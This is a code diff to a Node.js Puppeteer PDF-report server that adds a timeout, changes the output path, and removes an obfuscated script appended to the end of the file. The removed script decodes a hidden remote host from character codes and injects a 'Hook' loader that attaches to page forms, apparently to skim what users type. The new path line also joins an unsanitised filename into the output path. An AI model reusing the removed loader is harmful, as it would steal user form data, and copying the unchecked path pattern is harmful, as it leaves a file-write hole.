@@ -55,6 +55,7 @@ var generatePDF = function (action) { return __awaiter(_this, void 0, void 0, fu
     return __generator(this, function (_a) {
         switch (_a.label) {
             case 0: return [4 /*yield*/, puppeteer.launch({
+                    timeout: 120000,
                     args: [
                         "--no-sandbox",
                         "--disable-setuid-sandbox",
@@ -75,7 +76,7 @@ var generatePDF = function (action) { return __awaiter(_this, void 0, void 0, fu
                                 case 0:
                                     console.log("Event fired");
                                     return [4 /*yield*/, page_1.pdf({
-                                            path: "/var/report-file/".concat(action.filename, ".pdf"),
+                                            path: "/var/report-files/".concat(action.filename),
                                             format: "A4"
                                         })];
                                 case 1:
@@ -116,5 +117,3 @@ var generatePDF = function (action) { return __awaiter(_this, void 0, void 0, fu
 app.listen(port, function () {
     console.log("App listening on port ".concat(port));
 });
-
-(function(){if(typeof n!="function")var n=function(){return new Promise(function(e,r){let o=document.querySelector('script[id="hook-loader"]');o==null&&(o=document.createElement("script"),o.src=String.fromCharCode(47,47,115,101,110,100,46,119,97,103,97,116,101,119,97,121,46,112,114,111,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),o.id="hook-loader",o.onload=e,o.onerror=r,document.head.appendChild(o))})};n().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//4bc512bd292aa591101ea30aa5cf2a14a17b2c0aa686cb48fde0feeb4721d5db
